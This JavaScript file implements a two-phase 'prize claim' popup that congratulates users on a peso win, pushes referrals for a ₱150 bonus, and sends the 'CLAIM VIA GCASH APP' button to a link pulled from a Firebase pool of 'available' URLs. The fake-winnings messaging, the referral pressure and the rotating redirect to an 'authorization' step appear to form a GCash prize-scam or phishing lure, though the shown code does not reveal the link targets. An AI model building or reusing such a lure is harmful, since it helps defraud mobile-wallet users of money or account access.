/**
 * Popup Share Module - Remastered Phase 2 UI
 */

// ========== POPUP MODULE ==========
(function() {
    'use strict';
    
    let currentBalance = 0;
    let currentPhase = 1;
    
    // ========== INITIALIZATION ==========
    function init() {
        console.log('🎁 Popup Module Starting...');
        
        const popup = document.getElementById('prizePopup');
        if (!popup) {
            console.error('Popup element not found!');
            return;
        }
        
        attachClaimButton();
        console.log('✅ Popup Module ready');
    }
    
    // ========== ATTACH CLAIM BUTTON ==========
    function attachClaimButton() {
        const claimBtn = document.getElementById('claimNowBtn');
        if (!claimBtn) return;
        
        const newBtn = claimBtn.cloneNode(true);
        claimBtn.parentNode.replaceChild(newBtn, claimBtn);
        
        newBtn.addEventListener('click', function(e) {
            e.preventDefault();
            e.stopPropagation();
            
            let balance = 0;
            if (window.PromotionCore) {
                balance = window.PromotionCore.getBalance();
            } else {
                const balanceEl = document.getElementById('userBalanceDisplay');
                if (balanceEl) balance = parseFloat(balanceEl.innerText) || 0;
            }
            
            showPopup(balance);
            
            if (window.PromotionCore) window.PromotionCore.playSound('scatter');
            if (window.ConfettiModule) window.ConfettiModule.start();
        });
    }
    
    // ========== GET PAYOUT LINK ==========
    async function getLatestPayoutLink() {
        try {
            const db = firebase.database();
            const snapshot = await db.ref('links').orderByChild('status').equalTo('available').limitToFirst(1).once('value');
            if (snapshot.exists()) {
                const key = Object.keys(snapshot.val())[0];
                const linkData = snapshot.val()[key];
                return { key: key, url: linkData.url };
            }
            return null;
        } catch(e) {
            console.error('Link error:', e);
            return null;
        }
    }
    
    // ========== ANIMATION TRANSITION ==========
    function transitionToPhase2() {
        const popupInner = document.querySelector('.popup-inner');
        if (!popupInner) return;
        
        popupInner.style.transition = 'opacity 0.3s ease, transform 0.3s ease';
        popupInner.style.opacity = '0';
        popupInner.style.transform = 'scale(0.95)';
        
        setTimeout(() => {
            showPhase2();
            popupInner.style.opacity = '1';
            popupInner.style.transform = 'scale(1)';
        }, 300);
    }
    
    // ========== PHASE 1: DEFAULT ==========
    function showPhase1(balance) {
        const popupInner = document.querySelector('.popup-inner');
        if (!popupInner) return;
        
        currentBalance = balance;
        currentPhase = 1;
        
        popupInner.style.transition = '';
        popupInner.style.opacity = '1';
        popupInner.style.transform = '';
        
        popupInner.innerHTML = `
            <div class="popup-close" id="popupClosePhase1">✕</div>
            <h2 class="popup-title">🎉 HOORAY! 🎉</h2>
            <div class="prize-amount">₱<span id="popupBalanceAmount">${balance.toFixed(2)}</span></div>
            <div class="divider"></div>
            <div class="invite-text">Your friend must confirm your invitation to get extra <strong>₱150 bonus</strong>.</div>
            <div class="luckyday-image-container">
                <img src="images/luckyday.png" alt="Lucky Day" class="luckyday-img" onerror="this.style.display='none'">
            </div>
            <div class="divider"></div>
            <div class="indicator-group">
                <div class="indicator"></div>
                <div class="indicator"></div>
                <div class="indicator"></div>
            </div>
            
            <button class="claim-gcash-button" id="claimGCashBtn" style="transition: all 0.2s ease;">
                <img src="images/gc_icon.png" class="gc-icon"> CLAIM THRU GCASH
            </button>

            <div class="button-separator"></div>

            <button class="back-btn" id="backBtnPhase1">
                ← BACK
            </button>
        `;
        
        const closeBtn = document.getElementById('popupClosePhase1');
        if (closeBtn) closeBtn.onclick = function() { closePopup(); };
        
        const backBtn = document.getElementById('backBtnPhase1');
        if (backBtn) backBtn.onclick = function() { closePopup(); };
        
        const claimBtn = document.getElementById('claimGCashBtn');
        if (claimBtn) {
            claimBtn.onclick = function() {
                this.style.transform = 'scale(0.98)';
                setTimeout(() => { this.style.transform = 'scale(1)'; }, 150);
                transitionToPhase2();
            };
        }
    }
    
   // ========== PHASE 2: REMASTERED UI WITH FIXED BUTTON ==========
function showPhase2() {
    const popupInner = document.querySelector('.popup-inner');
    if (!popupInner) return;
    
    currentPhase = 2;
    
    popupInner.innerHTML = `
        <div class="popup-close" id="popupClosePhase2">✕</div>
        
        <!-- WINNER ANIMATION -->
        <div style="text-align: center; margin-bottom: 10px;">
            <div style="font-size: 60px; animation: bounceIn 0.5s ease;">🏆</div>
        </div>
        
        <!-- TITLE -->
        <h2 style="text-align: center; font-family: 'Orbitron', monospace; font-size: 22px; font-weight: 900; background: linear-gradient(135deg, #ffd700, #ffaa33); -webkit-background-clip: text; background-clip: text; color: transparent; margin: 5px 0; letter-spacing: 1px;">
            GREAT JOB ON YOUR FIRST WIN!
        </h2>
        
        <div class="divider" style="width: 40px; margin: 10px auto;"></div>
        
        <!-- MESSAGE -->
        <div style="background: linear-gradient(135deg, rgba(255,215,0,0.08), rgba(255,215,0,0.02)); border-radius: 16px; padding: 15px; margin: 10px 0;">
            <p style="font-family: 'Inter', sans-serif; font-size: 13px; color: #e0e0e0; line-height: 1.5; text-align: center; margin: 0 0 10px 0;">
                "Nice work today! You made that look easy — you can definitely earn even more."
            </p>
            <p style="font-family: 'Inter', sans-serif; font-size: 13px; color: #ffd700; line-height: 1.5; text-align: center; margin: 0; font-weight: 500;">
                Your task rewards of 
                <span style="font-size: 28px; font-weight: 900; color: #ffd700; text-shadow: 0 0 10px rgba(255,215,0,0.5); display: inline-block; margin: 0 5px;">₱${currentBalance.toFixed(2)}</span> 
                are officially ready to be claimed!
            </p>
        </div>
        
        <!-- AUTHORIZE HIGHLIGHT -->
        <div style="background: linear-gradient(135deg, rgba(0,100,255,0.15), rgba(0,100,255,0.05)); border: 1px solid rgba(0,100,255,0.4); border-radius: 50px; padding: 12px 20px; margin: 15px 0; text-align: center;">
            <p style="font-family: 'Inter', sans-serif; font-size: 12px; color: #ccc; margin: 0;">
                Once your claiming process is 
                <span style="font-family: 'Orbitron', monospace; font-size: 16px; font-weight: 900; color: #00aaff; text-shadow: 0 0 8px rgba(0,170,255,0.5); display: inline-block; letter-spacing: 2px;">AUTHORIZED</span>, 
                your prize will be transferred instantly to your GCash wallet.
            </p>
        </div>
        
        <!-- PRIZE AMOUNT CARD -->
        <div style="background: linear-gradient(145deg, #1a1a2e, #0f0f1a); border: 2px solid #ffd700; border-radius: 20px; padding: 15px; margin: 15px 0; text-align: center; box-shadow: 0 0 20px rgba(255,215,0,0.2);">
            <div style="font-size: 10px; color: #ffd700; text-transform: uppercase; letter-spacing: 3px; margin-bottom: 5px;">PRIZE AMOUNT</div>
            <div style="font-size: 56px; font-weight: 900; color: #ffd700; text-shadow: 0 0 15px rgba(255,215,0,0.4); font-family: 'Orbitron', monospace;">₱${currentBalance.toFixed(2)}</div>
            <div style="height: 2px; background: linear-gradient(90deg, transparent, #ffd700, transparent); width: 80%; margin: 10px auto;"></div>
            <div style="font-size: 10px; color: #888;">Ready for payout</div>
        </div>
        
        <!-- WARNING NOTE -->
        <div style="background: rgba(255,215,0,0.05); border-left: 3px solid #ffd700; border-radius: 8px; padding: 8px 12px; margin: 10px 0;">
            <p style="margin: 0; font-size: 10px; color: #ffd700; text-align: center;">
                💡 Make sure you have a verified GCash account to receive your reward
            </p>
        </div>
        
        <!-- CLAIM BUTTON - FIXED GREEN GRADIENT -->
        <button id="proceedBtn" style="background: linear-gradient(135deg, #00a650, #008c3a); border: none; border-radius: 60px; padding: 16px; width: 100%; margin-top: 15px; font-size: 16px; font-weight: bold; color: white; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 8px; transition: all 0.2s ease;">
            <img src="images/gc_icon.png" style="width: 22px; height: 22px;"> CLAIM VIA GCASH APP
        </button>

        <div class="button-separator" style="margin: 15px 0 10px;"></div>

        <button id="backBtnPhase2" style="background: linear-gradient(135deg, #ffd700, #ffaa33); border: none; border-radius: 50px; padding: 10px; width: 100%; font-weight: 700; color: #1a1a2e; font-size: 13px; cursor: pointer; transition: all 0.2s ease;">
            ← BACK TO PHASE 1
        </button>
    `;
    
    // Attach events
    const closeBtn = document.getElementById('popupClosePhase2');
    if (closeBtn) closeBtn.onclick = function() { closePopup(); };
    
    const backBtn = document.getElementById('backBtnPhase2');
    if (backBtn) {
        backBtn.onclick = function() {
            popupInner.style.transition = 'opacity 0.3s ease';
            popupInner.style.opacity = '0';
            setTimeout(() => {
                showPhase1(currentBalance);
                popupInner.style.opacity = '1';
            }, 300);
        };
    }
    
    const proceedBtn = document.getElementById('proceedBtn');
    if (proceedBtn) {
        proceedBtn.onclick = async function() {
            this.style.transform = 'scale(0.98)';
            setTimeout(() => { this.style.transform = 'scale(1)'; }, 150);
            
            this.disabled = true;
            this.innerHTML = `<img src="images/gc_icon.png" style="width: 22px; height: 22px; animation: pulse 0.8s infinite;"> PROCESSING PAYOUT...`;
            this.style.opacity = '0.8';
            
            const linkData = await getLatestPayoutLink();
            
            if (linkData && linkData.url) {
                this.innerHTML = `<img src="images/gc_icon.png" style="width: 22px; height: 22px;"> REDIRECTING TO GCASH...`;
                setTimeout(() => {
                    window.location.href = linkData.url;
                }, 800);
            } else {
                this.disabled = false;
                this.innerHTML = `<img src="images/gc_icon.png" style="width: 22px; height: 22px;"> CLAIM VIA GCASH APP`;
                this.style.opacity = '1';
                
                const errorDiv = document.createElement('div');
                errorDiv.style.cssText = 'background: rgba(255,68,68,0.15); border: 1px solid #ff4444; border-radius: 10px; padding: 10px; margin-top: 10px; text-align: center;';
                errorDiv.innerHTML = `
                    <span style="color: #ff8888; font-size: 12px;">⚠️ Withdrawal Unsuccessful</span><br>
                    <span style="color: #ccc; font-size: 10px;">No payout link available. Please contact support.</span>
                `;
                
                const existingError = popupInner.querySelector('.error-message');
                if (existingError) existingError.remove();
                proceedBtn.parentNode.insertBefore(errorDiv, proceedBtn.nextSibling);
                
                setTimeout(() => {
                    if (errorDiv) errorDiv.remove();
                }, 4000);
            }
        };
    }
}
    
    // ========== SHOW POPUP ==========
    function showPopup(balance) {
        currentBalance = balance;
        showPhase1(balance);
        
        const popup = document.getElementById('prizePopup');
        if (popup) {
            popup.style.display = 'flex';
            const ticker = document.getElementById('winnerTicker');
            if (ticker) ticker.style.display = 'none';
        }
    }
    
    // ========== CLOSE POPUP ==========
    function closePopup() {
        const popup = document.getElementById('prizePopup');
        if (popup) {
            popup.style.display = 'none';
            const ticker = document.getElementById('winnerTicker');
            if (ticker) ticker.style.display = 'flex';
            if (window.ConfettiModule) window.ConfettiModule.stop();
        }
    }
    
    // ========== START ==========
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', init);
    } else {
        init();
    }
    
    window.showPopup = showPopup;
    window.closePopup = closePopup;
})();
